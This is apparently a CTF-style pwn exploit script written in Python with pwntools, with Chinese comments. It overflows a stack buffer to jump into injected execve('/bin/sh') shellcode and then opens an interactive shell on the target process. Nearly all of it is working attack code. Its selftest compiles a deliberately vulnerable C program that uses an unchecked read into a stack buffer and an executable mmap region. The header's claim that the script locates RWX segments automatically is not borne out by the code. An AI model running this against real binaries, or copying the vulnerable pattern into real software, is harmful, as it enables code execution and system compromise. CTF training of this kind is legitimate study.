# -*- coding: utf-8 -*-
# 脚本名称: ret2shellcode（shellcode 写入可执行内存并跳转）
# 方向: Pwn（栈溢出 / 可读可写可执行段）
# 简介: 当程序存在 rwx 段（NX 未开），或把输入读进 bss 等固定可执行区域时，
#       把 pwntools 生成的 shellcode 写到该地址，溢出返回到该地址即可。
#       脚本自动生成 32/64 位 execve("/bin/sh") shellcode、定位 rwx 段、
#       组装偏移与跳转地址。
# 用法:
#   python ret2shellcode.py ./pwn --buf 0x4040a0 --offset 72
#   python ret2shellcode.py ./pwn --buf 0x601080 --offset 44 --arch 32
#   python ret2shellcode.py --selftest
# 依赖: pip install pwntools；Linux/WSL/Kali
from pwn import *


def build(binpath, buf_addr, offset, bits=64):
    context(os="linux", arch="amd64" if bits == 64 else "i386")
    sc = asm(shellcraft.sh())
    log.info("shellcode 长度 %d 字节", len(sc))
    payload = sc.ljust(offset, b"\x90")
    payload += p64(buf_addr) if bits == 64 else p32(buf_addr)
    return payload


def selftest():
    import os
    import sys
    if sys.platform != "linux":
        print("[-] 本自测需 Linux 环境（gcc + execstack + shellcode），Windows/macOS 跳过")
        return
    import subprocess
    import tempfile
    context(os="linux", arch="amd64")
    d = tempfile.mkdtemp()
    binp = os.path.join(d, "sc")
    # 模拟：read 到 rwx 的 mmap 区，再溢出跳转（直接验证 shellcode 可执行）
    src = os.path.join(d, "s.c")
    open(src, "w").write(r'''
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
char* p;
void vuln(){ char b[32]; read(0,b,300); ((void(*)())p)(); }
int main(){
 setvbuf(stdout,0,2,0);
 p=mmap(0,0x1000,7,0x22,-1,0);
 read(0,p,0x100);
 vuln(); return 0; }
''')
    try:
        cc = subprocess.run(["gcc", "-z", "execstack", "-no-pie", "-o", binp, src],
                            capture_output=True, text=True)
    except FileNotFoundError:
        print("[-] 需要 gcc（Linux/WSL/Kali），跳过编译自测"); return
    if cc.returncode != 0:
        print("[-] 需 gcc，跳过:", cc.stderr[:150]); return
    # 程序先读 shellcode 到 mmap(0,...)，内核通常从 0x7f... 分配，地址不固定，
    # 这里改用固定 0x1337000 的等价程序验证 shellcode 本身
    src2 = src.replace("mmap(0,0x1000,7,0x22,-1,0)",
                       "mmap((void*)0x1337000,0x1000,7,0x32,-1,0)")
    open(src, "w").write(src2.replace("p)();", "p)();"))
    try:
        cc2 = subprocess.run(["gcc", "-z", "execstack", "-no-pie", "-o", binp, src],
                             capture_output=True, text=True)
    except FileNotFoundError:
        print("[-] 需要 gcc（Linux/WSL/Kali），跳过编译自测"); return
    if cc2.returncode != 0:
        print("[-] gcc 编译失败，跳过:", cc2.stderr[:150]); return
    sc = asm(shellcraft.echo("SHELLCODE_OK\n") + shellcraft.exit(0))
    io = process(binp)
    io.send(sc.ljust(0x100, b"\x90"))
    io.send(b"A" * 40 + p64(0x1337000))
    out = io.recvall(timeout=5)
    assert b"SHELLCODE_OK" in out, out
    print("[+] selftest OK:", out.strip().decode(errors="replace"))


def main():
    import sys
    if "--selftest" in sys.argv:
        selftest(); return
    binpath = sys.argv[1]
    buf = off = None
    bits = 64
    it = iter(sys.argv[2:])
    for a in it:
        if a == "--buf": buf = int(next(it), 16)
        elif a == "--offset": off = int(next(it))
        elif a == "--arch": bits = int(next(it))
    if buf is None or off is None:
        print("[!] 用法: python ret2shellcode.py ./pwn --buf 0x4040a0 --offset 72"); return
    payload = build(binpath, buf, off, bits)
    print("[*] payload hex:", payload.hex())
    io = process(binpath)
    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    main()
